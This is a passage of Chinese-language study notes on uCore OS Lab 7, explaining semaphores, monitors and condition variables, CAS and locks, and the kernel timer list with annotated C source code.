<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">down</span><span class="params">(<span class="keyword">semaphore_t</span> *sem)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags = __down(sem, WT_KSEM); <span class="comment">/* 等待原因:内核信号量WT_KSEM */</span></span><br><span class="line">    assert(flags == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> __down(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="keyword">if</span> (sem-&gt;value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 当信号量的value值大于&#x27;0&#x27;时,说明还能容纳当前线程进入临界区 */</span></span><br><span class="line">        sem-&gt;value --; <span class="comment">/* value值递减(扣减信号量) */</span></span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 当信号量的value值等于&#x27;0&#x27;时,说明已经无法容纳更多的线程了 */</span></span><br><span class="line">    <span class="keyword">wait_t</span> __wait, *wait = &amp;__wait;</span><br><span class="line">    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state); <span class="comment">/* 使当前进程休眠 */</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    schedule(); <span class="comment">/* 重新执行调度程序(当前进程放弃CPU资源) */</span></span><br><span class="line"></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    wait_current_del(&amp;(sem-&gt;wait_queue), wait); <span class="comment">/* 将wait项从等待队列中删除 */</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;</span><br><span class="line">        <span class="keyword">return</span> wait-&gt;wakeup_flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当信号量的value值大于“0”时，说明还能容纳当前线程进入临界区</li>
<li>当信号量的value值等于“0”时。说明已经无法容纳更多的线程了，此时需要将当前线程阻塞在信号量的等待队列上，等待信号量的 up 操作将其唤醒</li>
<li>按照程序的逻辑，value值不可能小于“0”</li>
</ul>
<p><strong>退出临界区时，uCore会执行 up 函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">up</span><span class="params">(<span class="keyword">semaphore_t</span> *sem)</span> </span>&#123;</span><br><span class="line">    __up(sem, WT_KSEM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">void</span> __up(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">wait_t</span> *wait;</span><br><span class="line">        <span class="keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/* 尝试获取等待队列的第一项,如果有就唤醒,没有就增加信号量 */</span></span><br><span class="line">            sem-&gt;value ++; <span class="comment">/* value值递增(增加信号量) */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(wait-&gt;proc-&gt;wait_state == wait_state);</span><br><span class="line">            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="number">1</span>); <span class="comment">/* 将等待队列中的wait项对应的线程唤醒 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>等待队列为NULL，代表了资源实体充足，也就是说没有进程因为“互斥资源实体不足”而进入等待队列，自然没有必要唤醒</li>
<li>信号量增加，代表了剩余可供并发进程使用的资源实体数增加</li>
</ul>
<p>PS：可以发现，ucore 对临界区的处理和 PV 操作有点不同，并没有刻意让 value 值为负，而是直接将当前进程添加入等待队列，退出临界区时，又从等待队列中唤醒该进程</p>
<p><strong>与信号量有关的函数</strong></p>
<ul>
<li>sem_init：初始化信息量（各个条目需要手动输入）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sem_init</span><span class="params">(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    sem-&gt;value = value;</span><br><span class="line">    wait_queue_init(&amp;(sem-&gt;wait_queue));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>未进行初始化的信号量根本就没有对应的等待队列，所以需要调用 <code>wait_queue_init</code> 来初始化一个等待队列</li>
<li>因为信号量是分配到栈上的，所以不需要格外的“create”或者“destroy”操作</li>
</ul>
<h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><p>管程（Monitor）是一种用于多线程互斥访问共享资源的程序结构（其实就是封装了一下PV操作），它为进程提供了一种“抽象”，使进程可以通过访问管程来间接访问共享资源</p>
<ul>
<li>采用面向对象方法，简化了线程间的同步控制</li>
<li>任一时刻最多只有一个线程执行管程代码</li>
<li>正在管程中的线程可临时放弃管程的互斥访问，等待事件出现时恢复</li>
</ul>
<p>管程的组成</p>
<ul>
<li>一个锁：控制管程代码的互斥访问</li>
<li>0-n 个条件变量：用于管理共享数据的并发访问</li>
</ul>
<p>引入管程机制的目的：</p>
<ul>
<li>把分散在各进程中的临界区集中起来进行管理</li>
<li>防止进程有意或无意的违法同步操作（防止死锁）</li>
<li>便于用高级语言来书写程序，也便于程序正确性验证</li>
</ul>
<p><strong>在 ucore 中有如下结构体来管理管程：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span> <span class="title">monitor_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex;      <span class="comment">// 管程锁,每次只能有一个进程执行管程代码(该值初始化为&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> next;       <span class="comment">// 用于条件同步(进程同步操作的信号量),发出signal操作的进程等条件为真之前进入睡眠</span></span><br><span class="line">    <span class="keyword">int</span> next_count;         <span class="comment">// 休眠的信令进程数</span></span><br><span class="line">    <span class="keyword">condvar_t</span> *cv;          <span class="comment">// 当前管程中存放所有条件变量的数组</span></span><br><span class="line">&#125; <span class="keyword">monitor_t</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>mutex：<ul>
<li>管程中的成员变量 mutex 是一个二值信号量，是实现每次只允许一个进程进入管程的关键元素，确保了互斥访问性质</li>
</ul>
</li>
<li>cv：<ul>
<li>管程中的条件变量 cv 通过执行 wait_cv，会使得等待某个条件 C 为真的进程能够离开管程并睡眠，且让其他进程进入管程继续执行</li>
<li>而进入管程的某进程设置条件 C 为真并执行 signal_cv 时，能够让等待某个条件 C 为真的睡眠进程被唤醒，从而继续进入管程中执行</li>
</ul>
</li>
<li>next，next_count：<ul>
<li>管程中的成员变量信号量 next 和整形变量 next_count 是配合进程对条件变量 cv 的操作而设置的</li>
<li>这是由于发出signal_cv 的进程 A 会唤醒睡眠进程 B，进程 B 执行会导致进程 A 睡眠，直到进程 B 离开管程，进程 A 才能继续执行，这个同步过程是通过信号量 next 完成的 </li>
</ul>
</li>
</ul>
<p><strong>下面是与条件变量有关的结构体：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">condvar</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;        <span class="comment">// 条件变量所对应的信号量</span></span><br><span class="line">    <span class="keyword">int</span> count;              <span class="comment">// 等待当前条件变量的等待进程总数</span></span><br><span class="line">    <span class="keyword">monitor_t</span> * owner;      <span class="comment">// 当前条件变量的父管程</span></span><br><span class="line">&#125; <span class="keyword">condvar_t</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>sem：信号量 sem 用于让发出 wait_cv 操作的</li>
<li>count：表示等在这个条件变量上的睡眠进程的个数 </li>
<li>owner：表示此条件变量的宿主是哪个管程 </li>
</ul>
<p><strong>与管程有关的函数：</strong></p>
<ul>
<li>monitor_init：初始化一个管程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>     </span></span><br><span class="line"><span class="function"><span class="title">monitor_init</span> <span class="params">(<span class="keyword">monitor_t</span> * mtp, <span class="keyword">size_t</span> num_cv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    assert(num_cv&gt;<span class="number">0</span>);</span><br><span class="line">    mtp-&gt;next_count = <span class="number">0</span>;</span><br><span class="line">    mtp-&gt;cv = <span class="literal">NULL</span>;</span><br><span class="line">    sem_init(&amp;(mtp-&gt;mutex), <span class="number">1</span>); <span class="comment">/* 初始化信号量mutex(管程锁)为&#x27;1&#x27; */</span></span><br><span class="line">    sem_init(&amp;(mtp-&gt;next), <span class="number">0</span>); <span class="comment">/* 初始化信号量next为&#x27;0&#x27; */</span></span><br><span class="line">    mtp-&gt;cv =(<span class="keyword">condvar_t</span> *) kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">condvar_t</span>)*num_cv); <span class="comment">/* 分配条件变量 */</span></span><br><span class="line">    assert(mtp-&gt;cv!=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;num_cv; i++)&#123; <span class="comment">/* 初始化各个条件变量的值 */</span></span><br><span class="line">        mtp-&gt;cv[i].count=<span class="number">0</span>;</span><br><span class="line">        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="number">0</span>);</span><br><span class="line">        mtp-&gt;cv[i].owner=mtp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>cond_signal：当某个线程准备离开临界区，准备释放对应的条件变量时，执行该函数（需要实现）</li>
<li>cond_wait：当某个线程需要等待锁时，执行该函数（需要实现）</li>
</ul>
<h2 id="进程的交互关系"><a href="#进程的交互关系" class="headerlink" title="进程的交互关系"></a>进程的交互关系</h2><div class="table-container">
<table>
<thead>
<tr>
<th>相互感知的程度</th>
<th>交互关系</th>
<th>进程间的影响</th>
</tr>
</thead>
<tbody>
<tr>
<td>相互不感知（完全不了解其他进程的存在）</td>
<td>独立</td>
<td>一个进程的操作对其他进程的结果无影响</td>
</tr>
<tr>
<td>间接感知（双方都与第三方交互，例如数据共享）</td>
<td>通过共享进行协作</td>
<td>一个进程的结果依赖于共享资源的状态</td>
</tr>
<tr>
<td>直接感知（双方直接交互，例如通信）</td>
<td>通过通信进行协作</td>
<td>一个进程的结果依赖于从其他进程获得的信息</td>
</tr>
</tbody>
</table>
</div>
<p>进程之间可能出现三种关系：</p>
<ul>
<li>互斥（mutual exclusion）：一个进程占用资源，其他进程不能使用</li>
<li>死锁（deadlock）：多个进程占用部分资源，形成循环等待</li>
<li>饥饿（starvation）：其他进程可能轮流占用资源，一个进程一直得不到资源</li>
</ul>
<h2 id="CAS与锁"><a href="#CAS与锁" class="headerlink" title="CAS与锁"></a>CAS与锁</h2><p><strong>CAS</strong></p>
<p>CPU拥有多个物理核心，利用超线程技术可以把这些物理核心分为更多的逻辑核心</p>
<p>这就产生了一些问题：</p>
<img src="/2022/05/01/Ucore-Lab7/1651291477532-1651554724146.png" class width="1651291477532"> 
<p>左边是我们预想的执行顺序，右边是可以产生的情况（从不同的寄存器中读取了“0”）</p>
<p>如果把 “i++” 设置为原子操作，那么 “i+2”，“i+3”，“i*3” …… 这些都要设置为原子操作，大大影响了效率，于是 CPU 就提供了一个抽象的底层指令 cas（Compare and Set）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cas(&amp;i,<span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>更新内存地址“i”的时候，需要告诉CPU过去的值“0”，和想要更新的值“1”，CPU会先对比过去的值，然后再更新需要的值“1”，如果对比不通过，CPU就不作出相应</li>
<li>通过这种方式，CPU可以给更多指令添加原子操作</li>
</ul>
<p>假设有两个线程：（“i”初始化为“0”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: i++;</span><br><span class="line">B: i++;</span><br></pre></td></tr></table></figure>
<p>线程A可以通过“cas(&amp;i,0,1)”，然后“i”变为“1”，线程B就不能通过了，然后线程B就会采取如下操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(!cas(&amp;i,i,i++));</span><br></pre></td></tr></table></figure>
<p><strong>锁</strong></p>
<p>锁是一个抽象的数据结构：</p>
<ul>
<li>使用一个二进制变量，用于表示锁定/解锁</li>
<li>Lock::Acquire()：锁被释放前一直等待，直到得到锁</li>
<li>Lock::Release()：释放锁，唤醒任何等待的进程</li>
</ul>
<p>使用锁可以解决一些 cas 无法解决的问题</p>
<h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><p>定时器（timer）可以帮助操作系统在 <strong>经过一段特定时间</strong> 后执行一些特殊操作（例如：唤醒执行线程），可以说，正是有了定时器，操作系统才有了时间这个概念</p>
<p><code>timer_t</code> 结构体中存储了一个定时器所需要的相关数据，包括 <strong>倒计时时间</strong> 以及 <strong>所绑定的进程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> expires;			<span class="comment">// 定时器的过期时间(指定定时器到期的时间)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span>		<span class="comment">// 在计时器中等待的进程(如果过期时间已结束,该进程将被重新安排)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> timer_link;		<span class="comment">// 计时器链表(用于管理计时器)</span></span><br><span class="line">&#125; <span class="keyword">timer_t</span>;</span><br></pre></td></tr></table></figure>
<p>以下便是 ucore 中和定时器有关的函数：</p>
<ul>
<li>timer_init：用于初始化并返回某个 <code>timer</code>（各个参数都需要手动设置）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">timer_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">timer_init</span><span class="params">(<span class="keyword">timer_t</span> *timer, struct proc_struct *proc, <span class="keyword">int</span> expires)</span> </span>&#123;</span><br><span class="line">    timer-&gt;expires = expires; </span><br><span class="line">    timer-&gt;proc = proc;</span><br><span class="line">    list_init(&amp;(timer-&gt;timer_link));</span><br><span class="line">    <span class="keyword">return</span> timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>add_timer：用于将某个 <code>timer</code> 按照 <code>expires</code> 的大小添加进 <code>timer链表</code> 中 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> timer_list; <span class="comment">/* 记录有timer链表的链表头 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">add_timer</span><span class="params">(<span class="keyword">timer_t</span> *timer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* local_intr_save:屏蔽中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert(timer-&gt;expires &gt; <span class="number">0</span> &amp;&amp; timer-&gt;proc != <span class="literal">NULL</span>);</span><br><span class="line">        assert(list_empty(&amp;(timer-&gt;timer_link)));</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list); <span class="comment">/* 获取链表头 */</span></span><br><span class="line">        <span class="keyword">while</span> (le != &amp;timer_list) &#123; <span class="comment">/* 遍历整个链表,按照expires大小插链(从小到大) */</span></span><br><span class="line">            <span class="keyword">timer_t</span> *next = le2timer(le, timer_link); </span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires &lt; next-&gt;expires) &#123; </span><br><span class="line">                next-&gt;expires -= timer-&gt;expires; <span class="comment">/* 使目标结点next的expires减去timer-&gt;expires */</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            timer-&gt;expires -= next-&gt;expires; <span class="comment">/* 每遍历一次,timer-&gt;expires不断减小(保证了expires是从小到大排序的) */</span></span><br><span class="line">            le = list_next(le);</span><br><span class="line">        &#125;</span><br><span class="line">        list_add_before(le, &amp;(timer-&gt;timer_link)); <span class="comment">/* 插入结点前(从小到大) */</span></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* local_intr_restore:打开中断 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>del_timer：用于将某个 <code>timer</code> 从 <code>timer链表</code> 中删除</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_timer</span><span class="params">(<span class="keyword">timer_t</span> *timer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* local_intr_save:屏蔽中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!list_empty(&amp;(timer-&gt;timer_link))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">list_entry_t</span> *le = list_next(&amp;(timer-&gt;timer_link));</span><br><span class="line">                <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">                    next-&gt;expires += timer-&gt;expires; <span class="comment">/* 设使目标结点next的expires加上timer-&gt;expires(平衡add_timer的影响) */</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list_del_init(&amp;(timer-&gt;timer_link)); <span class="comment">/* 将当前timer从链表中移除 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* local_intr_restore:打开中断 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>run_timer_list：用于更新定时器的时间，并更新当前进程的运行时间片，如果当前定时器的剩余时间结束，则唤醒某个处于 <code>WT_INTERRUPTED</code> 等待状态的进程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WT_INTERRUPTED               0x80000000 <span class="comment">/* 等待状态可以被中断(可以苏醒) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">run_timer_list</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* local_intr_save:屏蔽中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list); <span class="comment">/* 获取timer链表头 */</span></span><br><span class="line">        <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *timer = le2timer(le, timer_link); <span class="comment">/* 获取第一个timer结构体 */</span></span><br><span class="line">            assert(timer-&gt;expires != <span class="number">0</span>); </span><br><span class="line">            timer-&gt;expires --; <span class="comment">/* 间接使所有timer的expires都减一的目的 */</span></span><br><span class="line">            <span class="keyword">while</span> (timer-&gt;expires == <span class="number">0</span>) &#123; <span class="comment">/* 遍历timer链表,找出所有连续的expires为0的timer,将其唤醒后再把timer删除 */</span></span><br><span class="line">                le = list_next(le);</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> timer-&gt;proc; <span class="comment">/* 获取对应的进程 */</span></span><br><span class="line">                <span class="keyword">if</span> (proc-&gt;wait_state != <span class="number">0</span>) &#123;</span><br><span class="line">                    assert(proc-&gt;wait_state &amp; WT_INTERRUPTED); <span class="comment">/* 断言正在等待的目标进程的wait_state是WT_INTERRUPTED */</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    warn(<span class="string">&quot;process %d&#x27;s wait_state == 0.\n&quot;</span>, proc-&gt;pid);</span><br><span class="line">                &#125;</span><br><span class="line">                wakeup_proc(proc); <span class="comment">/* 设置新的子进程可执行(唤醒该进程) */</span></span><br><span class="line">                del_timer(timer); <span class="comment">/* 用于将某个timer从timer链表中删除 */</span></span><br><span class="line">                <span class="keyword">if</span> (le == &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                timer = le2timer(le, timer_link);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sched_class_proc_tick(current); <span class="comment">/* 处理时钟中断的函数,令调度框架更新对应的调度参数(lab6中用此函数处理时钟中断,lab7中被run_timer_list替代) */</span></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* local_intr_restore:打开中断 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定时器的检查机制：</p>
<p>内核会每隔一段时间会检查一次定时器（如果定时器的 <code>expires</code> 为“0”，内存就会执行某个进程），但是检查的频率可能不相同，对于 <code>expires</code> 越小的定时器，内核检查的频率越高（例如：如果 <code>expires</code> 为“一年”，可能内核就一个月检查一次，如果 <code>expires</code> 小于一个月，内核就每天检查一次）</p>
<ul>
<li>处于性能考虑，每个新添加的 timer 都会按照其 <code>expires</code> 属性的大小排列，同时减去上一个 timer 的 <code>expires</code> 属性<ul>
<li>在 run_timer_list 中，程序会遍历 timer 链表，找出所有连续的expires为“0”的 timer，所以按大小排序后，一次执行 run_timer_list 后可能会找到多个目标，提高了效率</li>
<li>按照 timer 的机制：在更新 timer_list 中的所有 timer 的 expires 时，只需递减链首的第一个 timer 的 expire，即可间接达到所有 timer 的 expires 减一的目的</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">timer1-&gt;expires = <span class="number">20</span>;</span><br><span class="line">timer2-&gt;expires = <span class="number">38</span>;</span><br><span class="line">timer3-&gt;expires = <span class="number">24</span>;</span><br><span class="line">timer4-&gt;expires = <span class="number">10</span>;</span><br><span class="line">----------------------------</span><br><span class="line">timer1插入 &gt;&gt; timer1:<span class="number">20</span> </span><br><span class="line">timer2插入 &gt;&gt; timer1:<span class="number">20</span> &lt;=&gt; timer2:<span class="number">18</span>(<span class="number">38</span>)</span><br><span class="line">timer3插入 &gt;&gt; timer1:<span class="number">20</span> &lt;=&gt; timer3:<span class="number">4</span>(<span class="number">24</span>) &lt;=&gt; timer2:<span class="number">14</span>(<span class="number">38</span>)</span><br><span class="line">timer4插入 &gt;&gt; timer4:<span class="number">10</span> &lt;=&gt; timer1:<span class="number">10</span>(<span class="number">20</span>) &lt;=&gt; timer3:<span class="number">4</span>(<span class="number">24</span>) &lt;=&gt; timer2:<span class="number">14</span>(<span class="number">38</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>在目标 timer 遍历的时候会不断减去 “结点timer-&gt;expires” ，这样保证了 timer 链表中，原来的 timer-&gt;expires（没有进行过加减操作，是真正的 timer）是按从小到大排序的</li>
<li>这样也避免了 “结点timer-&gt;expires” 或者 “目标timer-&gt;expires” 被减到“0”的情况发生</li>
</ul>
<p>案例：do_sleep（将当前进程状态设置为睡眠）</p>
